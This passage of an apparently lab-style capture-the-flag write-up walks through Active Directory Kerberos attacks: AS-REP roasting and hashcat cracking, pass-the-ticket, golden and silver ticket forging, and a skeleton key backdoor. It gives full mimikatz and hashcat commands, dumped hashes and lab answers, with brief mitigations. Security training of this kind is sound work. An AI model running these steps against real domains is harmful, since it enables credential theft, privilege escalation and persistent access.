[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::edde:c433:95ab:1b34%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$User3@CONTROLLER.local:7EC95C29C0F996867A7F6C55FCADBC19$3D22242B6DCDE
      125D23AB664126C0FB562B6A09FA9733EA9138C6CF7A16532052EC17367EA9696A50C72EB391767F
      AF279B3C5CE9E10831020208A8562878E505C554842FD6B52665F2F51496CBE80B53114DFB13DD3F
      C659DF617BBFB376BF791350A25CC3AD382D2A2D5ADC34DEE47283F8D2177EAD3F2715246E6FC703
      EEA7B8B304AE22ED3DFE33E908B0DA466434C692B62A8E4A0C8B0DBA10772AFFDBCFE0C87DF04DEA
      E7FCAC64CEEC058A38B9833D560D45B06FF8B1D1115A8CB7DF9B47E6CBE5A1B8E6A7AD0096B3FA51
      8DFA7285933F1A460CCCF32A8F43466C91ECC4159155228E763516C7B112497740C71A3511B
```

##  Crack those Hashes w/ Hashcat

1. Copy and put hashes into text files. ``admin2hash.txt`` and ``user3hash.txt``
2. Insert ``23$`` after ``$krb5asrep$``
3. ``hashcat -m 18200 admin2hash.txt Pass.txt`` and ``hashcat -m 18200 user3hash.txt Pass.txt``

##  AS-REP Roasting Mitigations 

- Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective

- Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.

##   Answer the questions below

**What hash type does AS-REP Roasting use?**

- Kerberos 5, etype 23, AS-REP

**Which User is vulnerable to AS-REP Roasting?**

- User3

**What is the User's Password?**

- Password3

**Which Admin is vulnerable to AS-REP Roasting?**

- Admin2

**What is the Admin's Password?**

- P@$$W0rd2

* * *

## Task 6 - Pass the Ticket w/ mimikatz 

- Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory

##  Pass the Ticket Overview

Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

![0xskar](/assets/kerberos05.png)

##  Prepare Mimikatz & Dump Tickets 

1. ``mimikatz.exe`` - run mimikatz
2. ``privilege::debug`` - Ensure this outputs ``output '20' OK`` if it does not that means you do not have the administrator privileges to properly run mimikatz
3. ``sekurlsa::tickets /export`` - this will export all of the .kirbi tickets into the directory that you are currently in

- At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier
- When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt (example below)

``06/21/2022  12:33 AM             1,595 [0;6ea03]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi``

##  Pass the Ticket w/ Mimikatz

Now perform a pass the ticket attack to gain domain admin privileges.

1. ``kerberos::ptt [0;6ea03]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`` - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket
2. exit mimikats and ``klist`` - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets. 
3. we now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share. ``dir \\10.10.146.3\admin$``

##  Pass the Ticket Mitigation

- Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.

* * * 

## Task 7 - Golden/Silver Ticket Attacks w/ mimikatz 

If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

##  KRBTGT Overview 

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

##  Golden/Silver Ticket Attack Overview

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

![0xskar](/assets/kerberos06.png)

##  Dump the krbtgt hash

1. run mimikatz ``mimikatz.exe``
2. ensure we output privilege 20 OK ``peivilege::debug``
3. ``lsadump::lsa /inject /name:krbtgt`` - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

##  Create Golden/Silver Ticket

- ``Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:`` - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

1. in mimikats: ``lsadump::lsa /inject /name:SQLService`` To create a silver ticket we need this for the service accout SID and the 

```shell
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 

RID  : 00000455 (1109)
User : SQLService

 * Primary
    NTLM : cd40c9ed96265531b21fc5b1dafcfb0a
    LM   :
  Hash NTLM: cd40c9ed96265531b21fc5b1dafcfb0a
    ntlm- 0: cd40c9ed96265531b21fc5b1dafcfb0a
    lm  - 0: 7bb53f77cde2f49c17190f7a071bd3a0
```

2. create out silver ticket: ``Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:cd40c9ed96265531b21fc5b1dafcfb0a /id:1103`` we replaced the administrator krbtgt with the SQLService NTLM hash and sid with our SQLService account SID and changed the ID to 1103.

```shell
mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:cd40c9ed96265531b21fc5b1dafcfb0a /id:1103 
User      : Administrator 
Domain    : controller.local (CONTROLLER)
SID       : S-1-5-21-432953485-3795405108-1502158860
User Id   : 1103
Groups Id : *513 512 520 518 519
ServiceKey: cd40c9ed96265531b21fc5b1dafcfb0a - rc4_hmac_nt
Lifetime  : 6/21/2022 1:08:57 AM ; 6/18/2032 1:08:57 AM ; 6/18/2032 1:08:57 AM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted 
 * KrbCred generated

Final Ticket Saved to file !
```

##  Use the Golden/Silver Ticket to access other machines 

1. ``misc:cmd``

```shell
mimikatz # misc::cmd 
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF631EF43B8 
````

2. Access machine that we want. What we can access depends on the privileges of the user that we took the ticket from. However if we take the krbtgt we have access to the ENTIRE network (golden ticket).

##   Answer the questions below

**What is the SQLService NTLM Hash?**

- ``lsadump::lsa /inject /name:SQLService``
- cd40c9ed96265531b21fc5b1dafcfb0a

**What is the Administrator NTLM Hash?**

- ``lsadump::lsa /inject /name:Administrator``
- 2777b7fec870e04dda00cd7260f7bee6

* * * 

## Task 8 - Kerberos Backdoors w/ mimikatz 

- The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

##  Skeleton Key Overview

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

- Run ``mimikatz``
- Install Skeleton key ``misc::skeleton``
- Access the forest with default credentials, example:
- ``net use \\CONTROLLER-1\admin$ /user:Administrator mimikatz``

* * * 

## Task 9 - Conclusion 

Resources 

-    https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
-    https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
-    https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
-    https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
-    https://www.varonis.com/blog/kerberos-authentication-explained/
-    https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
-    https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf
-    https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf

* * * 



